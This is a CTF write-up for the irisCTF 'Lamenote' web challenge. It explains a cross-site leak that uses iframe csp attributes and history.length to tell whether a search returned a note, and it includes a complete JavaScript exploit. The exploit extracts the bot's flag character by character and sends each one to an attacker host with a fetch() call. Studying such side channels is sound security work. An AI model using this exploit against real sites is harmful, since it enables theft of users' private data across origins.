
---

layout: post

title: "Lamenote"

date: 2024-01-11 

tag-name: web xsleak history.length iframe-csp

---

# Lamenote

Author: sera

## Introduction

The challenge source code is not that big. All what it allows us to do is create a note in a iframe and <mark class="hltr-orange">search</mark> for them. Simply as that.

Here is the route responsible for searching a certain note
```python

@app.route("/search")
@check_request
def search():
	query = request.args.get("query", "")
	user = request.cookies.get("user", None)
	results = []
	notes_copy = copy.deepcopy(NOTES)
	for note in notes_copy.values():
		if note["owner"] == user and 
		(query in note["title"] or query in note["text"]):
			results.append(note)
		if len(results) >= 5:
			break
	if len(results) == 0:
		return "<!DOCTYPE html><body>No notes.</body>"
	if len(results) == 1:
		return render_note(results[0])
		
	return "<!DOCTYPE html><body>" + "".join("<a href='/note/" + note["id"] + "'>" + note["title"] + "</a> " for note in results) + "</body>"
```

Basically it takes a `query` parameter and our session token. Then it searches for all the note that contains our query both in the title and the text.
If there are no results, it renders a dummy html page. Otherwise if there is exactly one result it <mark class="hltr-orange">renders the note</mark> with the function `render_note`. 
In the end, if there are more than 1 result it shows us the list of notes.

As you may notice there is the decorator `@check_request` which is a custom decorator that checks if the `Sec-Fetch-Dest` is equal to `iframe`. Just for checking if we are making a request from an iframe.

```python
def render_note(note):
	data = "<!DOCTYPE html><body><b>" + note["title"] + "</b><br/>"+note["text"]
	if note["image"] is not None:
		g.image_url = note["image"]
		data += "<br/><img width='100%' src='" + note["image"] + "' crossorigin />"
	data += "</body>"
	return data
```

This is the `render_code` function which all it does is simply render our note with an image in it if it was provided during the creation.

Last but not least, there is one more decorator that makes the situation more difficult. The decorator is `@app.after_request` which applies the a <mark class="hltr-orange">strict csp</mark> on every request.


```python
host = re.compile("^[a-z0-9\.:]+$")
def csp(response):
	response.headers["Content-Security-Policy"] = "default-src 'none'; frame-src 'self';";
	if "image_url" in g:
		url = g.image_url
		parsed = urlparse(url)
		if host.match(parsed.netloc) and parsed.scheme in ["http", "https"]:
		response.headers["Content-Security-Policy"] += "img-src " + parsed.scheme + "://" + parsed.hostname + ";"
	response.headers["Cross-Origin-Opener-Policy"] = "same-origin"
	response.headers["Cross-Origin-Resource-Policy"] = "same-origin"
	response.headers["Cross-Origin-Embedder-Policy"] = "require-corp"
	return response
```

The only thing that stands out here (besides the `default-src` :cry:) is the <mark class="hltr-orange">dynamic</mark> `img-src` directive that gets added if a note is created with an image in it.

## How in the world i get the flag?

As you may imagine, there is a bot in this challenge that simulates a user. The bot simply creates a note with the flag <mark class="hltr-orange">inside the body</mark> and an image. Then it visits an arbitrary url provided by us.

There is no way to achieve XSS on the same origin of the challenge, since on the note creation is checked if our input contains a `<` both in the text, in the body and in the image url that we can provide.

This point us towards an xsleak. Since the admin visits our site, we can try with some browser-sorcery to leak the flag. The question is <mark class="hltr-orange">how?</mark>

I've not solved this challenge during the CTF, since my initial idea was trying to identify differences in the loading time of the `/search` page.
I was trying to load an iframe for every character in the alphabet, and look if there were any <mark class="hltr-orange">time differences</mark> between when the flag was present and when was not.

The main idea came from this [side-channel technique](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks), and although on my local machine was working, in remote was <mark class="hltr-orange">not reliable</mark>. 
I've also thought about abuse the connection pool of chrome, but this was more a crazy idea than something feasible in this challenge.

It was clear, after a certain point, that i needed a way to detect the presence or not of the `img-src` directive, since that means the presence of an image, and in our case that we correctly <mark class="hltr-orange">guessed</mark> a char in the flag.

## Allow me to introduce you history.length

After a lot of hours were i cannot find a way to detect the csp directive the CTF ends. So i started talking with @sera and reversing the provided exploit. The idea was that if we load an iframe with the csp attribute set to `img-src 'none'` we can add the csp directive on the loaded resources.

Now, the <mark class="hltr-orange">magic begins</mark> , if the loaded resources sets the `img-src` directive the page won't load due to the fact that the browser show us an error telling that the csp that the page applies is not strong enough as stated with our supplied attribute or the `Allow-CSP-From` header is not set. Otherwise there will be no problem, since the `img-src` directive is not set and the `defaul-src` is set to `none`.

<mark class="hltr-orange">IMPORTANT</mark> : We should think of the `csp` attribute in the iframes as a <mark class="hltr-orange">minimum requirement</mark> for the target page that, if is not met, it will not render (thank you @sera for the explanation).

How we can abuse this to leak the flag? Well, @sera told me that if the page won't load showing us the `chrome-error://chromewebdata/` page the <mark class="hltr-orange">history</mark> object is not updated :boom:.

So we can use this behaviour right? Yes, but it's incomplete. We need also to <mark class="hltr-orange">redirect</mark> the iframe to itself to actually perform the state update of the `history` object (and so the length parameter) property, since otherwise it won't be updated.
Actually, to be more clear, the `history.length` property is global across all the sub-resources loaded into the page and it provides the number of entries in the history that were either changed by `history.pushState` or by regular navigations. This means that we can access it from our controlled top window.
This attack is really well documented [here](https://xsleaks.dev/docs/attacks/navigations/)

In the end the path for leaking the flag is the following:

- Creating an iframe for every character of the alphabet, pointing to the `/search` endpoint with the `query` parameter equal to the flag plus the character that we want to leak.
- After the load of the iframe, refresh it with the same source.
- Check the `history.length` and if it's equal as it was with the previous character, then this is the character that <mark class="hltr-orange">we want to leak</mark>, because the error page has not updated the `history.length` value. Otherwise just go on, updating the value that we are checking.

Here is my exploit

```javascript
const URL = "https://lamenote-web.chal.irisc.tf/search?query="
const alphabet = "_}abcdefghijklmnopqrstuvwxyz"
const REPORT="https://site"

//need to pass our URL has https://site/?search=flag-known
var FLAG = `${document.location.search.split("?")[1].split("=")[1]}`
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

(async function(){
	async function leak(url){
		var iframe = document.createElement('iframe')
		iframe.sandbox="allow-same-origin"
		iframe.csp="img-src 'none'"
		iframe.src=url
		iframe.onload=()=>{
			setTimeout(()=>{
			iframe.onload=null
			iframe.src=url
			},100)
		}
		document.body.appendChild(iframe)
		await sleep(2000)
		let lengthHistory = window.history.length;
		return lengthHistory
	}

	//the "0" char is not in the flag since the flag format was known, 
	//and so we can use it as starting value
	var start = leak(URL+FLAG+"0") 
	//leaking 2 char at a time
	for(let y=0;y<2;y++){
		for(var c of alphabet){
			var lengthness = await leak(URL+FLAG+c)
			if(lengthness==start){
				FLAG=FLAG+c
				fetch(`${REPORT}/leaking?len=${lengthness}&char=${c}&flag=${FLAG}`)
				break
			}
		start=lengthness
		}
	}
})()

//irisctf{please_no_more_unintended_bugs}
```


We cannot create an "endless" exploit, since the `history.length` parameter as a maximum value of `50`, so i felt that 2 chars per round was a good choice. Otherwise the leak won't be reliable.

## Credits

I would like to thank @sera for dealing with me, and explaining everything that i needed to. 
Also i've found the challenge amazing






